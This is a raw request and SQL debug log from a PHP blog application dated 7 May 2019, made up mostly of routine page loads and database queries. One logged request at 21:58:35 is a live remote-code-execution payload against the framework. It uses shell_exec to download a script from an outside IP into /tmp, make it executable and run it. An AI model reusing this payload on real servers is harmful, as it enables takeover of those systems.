[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000479s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001688s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000513s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000502s ]
---------------------------------------------------------------
[2019-05-07T19:02:46+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001163s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002399s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000495s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001510s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000452s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000463s ]
---------------------------------------------------------------
[2019-05-07T19:02:47+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001271s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001914s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000442s ]
---------------------------------------------------------------
[2019-05-07T19:03:06+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001454s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002267s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000584s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001797s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000509s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000446s ]
---------------------------------------------------------------
[2019-05-07T19:03:30+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000941s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001773s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000432s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001427s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000462s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000373s ]
---------------------------------------------------------------
[2019-05-07T19:03:55+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.000935s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001909s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000530s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001584s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000469s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000499s ]
---------------------------------------------------------------
[2019-05-07T19:09:41+08:00] 95.133.30.174 GET blog/index.php
[ sql ] [ DB ] CONNECT:[ UseTime:0.001146s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001830s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000663s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001779s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000457s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000410s ]
---------------------------------------------------------------
[2019-05-07T19:09:43+08:00] 102.241.159.95 GET blog/index.php
[ sql ] [ DB ] CONNECT:[ UseTime:0.001162s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001856s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000502s ]
---------------------------------------------------------------
[2019-05-07T19:50:00+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001714s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002163s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000438s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001545s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000470s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001486s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000465s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000457s ]
---------------------------------------------------------------
[2019-05-07T19:56:05+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001381s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002518s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000635s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002204s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000913s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000459s ]
---------------------------------------------------------------
[2019-05-07T20:00:22+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001292s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002389s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000533s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002126s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000606s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001988s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000643s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000616s ]
---------------------------------------------------------------
[2019-05-07T20:28:55+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001030s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001862s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000438s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001513s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000423s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001438s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000491s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000390s ]
---------------------------------------------------------------
[2019-05-07T20:53:54+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001175s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001702s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000376s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001351s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000375s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001429s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000452s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000395s ]
---------------------------------------------------------------
[2019-05-07T21:27:02+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001346s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002113s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000448s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001913s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000507s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001844s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000556s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000451s ]
---------------------------------------------------------------
[2019-05-07T21:40:55+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001012s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001949s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000487s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001777s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000442s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001755s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000652s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000615s ]
---------------------------------------------------------------
[2019-05-07T21:58:35+08:00] 172.18.0.2 GET blog/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://81.6.42.123/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
[ sql ] [ DB ] CONNECT:[ UseTime:0.001007s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001992s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000389s ]
---------------------------------------------------------------
[2019-05-07T21:59:42+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001254s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002176s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000564s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001952s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000664s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000508s ]
---------------------------------------------------------------
[2019-05-07T21:59:43+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001123s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001980s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000509s ]
---------------------------------------------------------------
[2019-05-07T22:01:26+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001756s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002204s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000578s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001916s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000596s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000506s ]
---------------------------------------------------------------
[2019-05-07T22:24:56+08:00] 172.18.0.2 GET blog/detail/index?id=22
[ sql ] [ DB ] CONNECT:[ UseTime:0.000890s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001709s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000379s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001375s ]
[ sql ] [ SQL ] SELECT `id`,`user_name`,`title`,`cont`,`to_top`,`pic`,`see_num`,`argue_num`,`is_best`,`create_time`,`type_id`,`type` FROM `article` `a` WHERE  `is_delete` = 0  AND `id` = 22 LIMIT 1 [ RunTime:0.000429s ]
---------------------------------------------------------------
[2019-05-07T22:30:09+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001122s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.002110s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000536s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001481s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000467s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000497s ]
---------------------------------------------------------------
[2019-05-07T23:20:20+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001454s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002419s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000602s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001939s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000602s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.002015s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000672s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000593s ]
---------------------------------------------------------------
[2019-05-07T23:37:04+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001148s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.002086s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000531s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001663s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000489s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001378s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000423s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000385s ]
---------------------------------------------------------------
[2019-05-07T23:51:21+08:00] 172.18.0.2 GET blog/
[ sql ] [ DB ] CONNECT:[ UseTime:0.001171s ] mysql:host=mysql;port=3306;dbname=blog;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `article_type` [ RunTime:0.001903s ]
[ sql ] [ SQL ] SELECT `id`,`title` FROM `article_type` WHERE  `is_delete` = 0 [ RunTime:0.000551s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `friend_link` [ RunTime:0.001864s ]
[ sql ] [ SQL ] SELECT `cont`,`url` FROM `friend_link` WHERE  `is_delete` = 0 ORDER BY `order_no` [ RunTime:0.000482s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `article` [ RunTime:0.001508s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`see_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `see_num` DESC LIMIT 6 [ RunTime:0.000465s ]
[ sql ] [ SQL ] SELECT `id`,`title`,`argue_num`,`create_time` FROM `article` `a` WHERE  `is_delete` = 0 ORDER BY `argue_num` DESC LIMIT 6 [ RunTime:0.000453s ]
